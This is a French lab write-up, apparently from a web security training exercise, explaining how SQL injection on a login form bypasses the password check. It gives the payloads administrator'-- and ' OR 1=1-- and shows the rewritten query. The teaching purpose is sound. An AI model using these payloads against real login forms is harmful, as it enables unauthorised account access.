
## 🎯 Objectif

Se connecter à l’application en tant que :

administrator

sans connaître son mot de passe.

---

# 🔍 Surface d’attaque

Fonction : **formulaire de login**

Requête interceptée dans Burp :

POST /login HTTP/1.1  
Content-Type: application/x-www-form-urlencoded

Body :

username=administrator&password=test

---

# 🗄 Requête SQL côté serveur

Le backend construit probablement une requête comme :

SELECT * FROM users   
WHERE username = 'administrator'   
AND password = 'test'

### Logique

La connexion est acceptée seulement si :

username = administrator  
ET  
password = correct

---

# 💡 Hypothèse de vulnérabilité

Le paramètre :

username

est inséré directement dans la requête SQL sans validation.

Donc il est possible de modifier la logique de la requête.

---

# 🛠 Exploitation

Modifier le paramètre :

username=administrator'--

Requête envoyée :

username=administrator'--&password=test

---

# ⚙️ Requête SQL obtenue

La requête devient :

SELECT * FROM users   
WHERE username = 'administrator'--'   
AND password = 'test'

Le symbole :

--

est un **commentaire SQL**.

Tout ce qui suit est ignoré.

La requête réellement exécutée devient :

SELECT * FROM users   
WHERE username = 'administrator'

---

# ⚡ Résultat

La vérification du mot de passe disparaît.

Le serveur considère que :

administrator existe → login accepté

La réponse HTTP montre généralement :

HTTP/302 redirect  
Location: /my-account?id=administrator

➡️ Connexion réussie.

---

# 🐞 Vulnérabilité

Nom :

SQL Injection

Type :

Authentication bypass

Cause :

L’entrée utilisateur est concaténée directement dans la requête SQL.

---

# 🧠 Pattern à retenir

Quand tu vois une requête :

POST /login

Tester immédiatement :

'--

ou

' OR 1=1--

---

# 📌 Structure classique d’un bypass login

1️⃣ fermer la chaîne SQL

'

2️⃣ commenter la fin de la requête

--

Payload :

administrator'--

---

# ⭐ Point clé du lab

Une injection SQL peut supprimer la vérification du mot de passe.

---

# 📚 Concepts appris

- SQL injection dans un formulaire login
    
- utilisation du commentaire SQL `--`
    
- manipulation de la clause `WHERE`
    
- bypass d’authentification
